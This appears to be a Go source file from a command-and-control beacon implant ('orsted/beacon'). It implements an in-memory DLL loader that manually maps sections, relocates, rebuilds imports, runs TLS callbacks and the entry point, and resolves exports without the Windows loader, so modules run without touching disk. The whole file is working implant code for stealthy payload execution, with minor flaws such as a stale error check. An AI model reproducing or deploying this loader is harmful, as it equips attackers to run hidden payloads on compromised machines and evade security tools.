package memorymodule

import (
	"errors"
	"log"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"

	"orsted/beacon/modules/memorymodule/utils/buildimporttable"
	"orsted/beacon/modules/memorymodule/utils/exectls"
	"orsted/beacon/modules/memorymodule/utils/mem"
	"orsted/beacon/modules/memorymodule/utils/memmoduletypes"
	"orsted/beacon/modules/memorymodule/utils/peparser"
	"orsted/beacon/modules/memorymodule/utils/relocation"
	"orsted/beacon/modules/memorymodule/utils/sections"
	"orsted/beacon/utils"
)

const (
	DLL_PROCESS_ATTACH = 0x1
)

type HMEMORYMODULE struct {
	Name      string
	PBase     uintptr
	ExportDir memmoduletypes.IMAGE_DATA_DIRECTORY
}

var LoadedMemoryModule []HMEMORYMODULE

func LoadMemoryModule(moduleName string, dllData []byte) (stdout []byte, stderr []byte, err error) {
	peHdrs, err := peparser.InitializePeStruct(dllData)
	if err != nil {
		return nil, []byte("Error in core"), err
	}

	dllPtr := uintptr(unsafe.Pointer(peHdrs.PFileBuffer))
	dllBase, err := windows.VirtualAlloc(uintptr(0),
		uintptr(peHdrs.PImgNtHdrs.OptionalHeader.SizeOfImage),
		windows.MEM_RESERVE|windows.MEM_COMMIT,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		return nil, []byte("Error in core"), err
	}

	numberOfSections := int(peHdrs.PImgNtHdrs.FileHeader.NumberOfSections)

	firstSectionAddr := uintptr(unsafe.Pointer(peHdrs.PImgeSectionHdrs))

	for i := 0; i < numberOfSections; i++ {
		sectionAddr := firstSectionAddr + uintptr(i)*unsafe.Sizeof(memmoduletypes.IMAGE_SECTION_HEADER{})
		section := (memmoduletypes.PIMAGE_SECTION_HEADER)(unsafe.Pointer(sectionAddr))

		sectionDestination := dllBase + uintptr(section.VirtualAddress)
		sectionBytes := (*byte)(unsafe.Pointer(dllPtr + uintptr(section.PointerToRawData)))

		mem.Memcpy(unsafe.Pointer(sectionDestination), unsafe.Pointer(sectionBytes), int(section.SizeOfRawData))

		if err != nil {
			log.Fatalf("[!] WriteProcessMemory Failed: %v \n", err)
		}

	}

	err = relocation.PerformBaseRelocation(peHdrs.PEntryBaseRelocDataDir, dllBase, uintptr(peHdrs.PImgNtHdrs.OptionalHeader.ImageBase))
	if err != nil {
		return nil, []byte("Error in core"), err
	}

	err = buildimporttable.FixImportAddressTable(peHdrs.PEntryImportDataDir, dllBase)
	if err != nil {
		return nil, []byte("Error in core"), err
	}

	err = sections.ChangePermission(dllBase, peHdrs.PImgNtHdrs, peHdrs.PImgeSectionHdrs)
	if err != nil {
		return nil, []byte("Error in core"), err
	}

	exectls.ExecuteTLS(dllBase, peHdrs.PEntryTLSDataDir)

	// Execute DLL Entry Point
	syscall.SyscallN(dllBase+uintptr(peHdrs.PImgNtHdrs.OptionalHeader.AddressOfEntryPoint), dllBase, DLL_PROCESS_ATTACH, 0)
	utils.Print("DLL function executed")

	exports := peHdrs.PEntryExportDataDir

	var newModule HMEMORYMODULE
	newModule.Name = moduleName
	newModule.PBase = dllBase
	newModule.ExportDir = *exports
	LoadedMemoryModule = append([]HMEMORYMODULE{newModule}, LoadedMemoryModule...)
	return []byte("Loaded Module " + moduleName), nil, nil
}

type IMAGE_EXPORT_DIRECTORY struct {
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32
	Base                  uint32
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32
	AddressOfNames        uint32
	AddressOfNameOrdinals uint32
}
type PIMAGE_EXPORT_DIRECTORY *IMAGE_EXPORT_DIRECTORY

func areEqual2(pBase uintptr, rva uint32, target string) bool {
	// Convert RVA to actual memory address
	addr := uintptr(pBase + uintptr(rva))

	// Manually read bytes until we hit a null terminator (0)
	for i := uintptr(0); ; i++ {
		// Read a single byte at a time
		char := *(*byte)(unsafe.Pointer(addr + i))
		if char == 0 && int(i) != len(target) {
			return false
		}
		if char == 0 && int(i) == len(target) {
			return true
		}
		if byte(char) != target[i] {
			return false
		}
	}

	// Convert the byte slice to a Go string
	return true
}

func CustomGetHandle(pBase uintptr, exports memmoduletypes.PIMAGE_DATA_DIRECTORY, name string) (uintptr, error) {
	pImgExportDir := PIMAGE_EXPORT_DIRECTORY(unsafe.Pointer(uintptr(pBase) + uintptr(exports.VirtualAddress)))

	numFunction := pImgExportDir.NumberOfFunctions

	AddressOfFuntionArray := unsafe.Slice((*uint32)(unsafe.Pointer(uintptr(pBase)+uintptr(pImgExportDir.AddressOfFunctions))), pImgExportDir.NumberOfFunctions)
	AddressOfNamesArray := unsafe.Slice((*uint32)(unsafe.Pointer(uintptr(pBase)+uintptr(pImgExportDir.AddressOfNames))), pImgExportDir.NumberOfFunctions)
	AddressOfNameOrdinalArray := unsafe.Slice((*uint16)(unsafe.Pointer(uintptr(pBase)+uintptr(pImgExportDir.AddressOfNameOrdinals))), pImgExportDir.NumberOfFunctions)

	for i := uint32(0); i < numFunction; i++ {
		functionNameRVA := AddressOfNamesArray[i]

		if areEqual2(uintptr(pBase), functionNameRVA, name) {
			return uintptr(pBase) + uintptr(AddressOfFuntionArray[AddressOfNameOrdinalArray[i]]), nil
		}
	}

	return 0, errors.New("Function Not Found")
}

func ExecuteFunctionInModule(moduleName string, functionName string, argument ...uintptr) (stdout []byte, stderr []byte, err error) {
	for _, module := range LoadedMemoryModule {
		if module.Name == moduleName {
			addr, err := CustomGetHandle(module.PBase, &module.ExportDir, functionName)
			if err != nil {
				return nil, nil, err
			}

			var stdoutPtr, stderrPtr *byte
			var stdoutSize, stderrSize int

            argument = append(argument, uintptr(unsafe.Pointer(&stdoutPtr)))
            argument = append(argument, uintptr(unsafe.Pointer(&stdoutSize)))
            argument = append(argument, uintptr(unsafe.Pointer(&stderrPtr)))
            argument = append(argument, uintptr(unsafe.Pointer(&stderrSize)))
			// Call DLL function with output parameter addresses
			syscall.SyscallN(
				addr,
                argument...
			)
            stdoutC := unsafe.Slice(stdoutPtr, stdoutSize)
            stderrC := unsafe.Slice(stderrPtr, stderrSize)

            stdout = make([]byte, stdoutSize)
            copy(stdout, stdoutC)
            stderr = make([]byte, stderrSize)
            copy(stderr, stderrC)

            freeAddr, err := CustomGetHandle(module.PBase, &module.ExportDir, "FreeMem")
			defer syscall.SyscallN(freeAddr, uintptr(unsafe.Pointer(stdoutPtr)))
			defer syscall.SyscallN(freeAddr, uintptr(unsafe.Pointer(stderrPtr)))

			return []byte(stdout), []byte(stderr), nil
		}
	}

	return nil, nil, errors.New("Module Not Found be sure to load it")
}
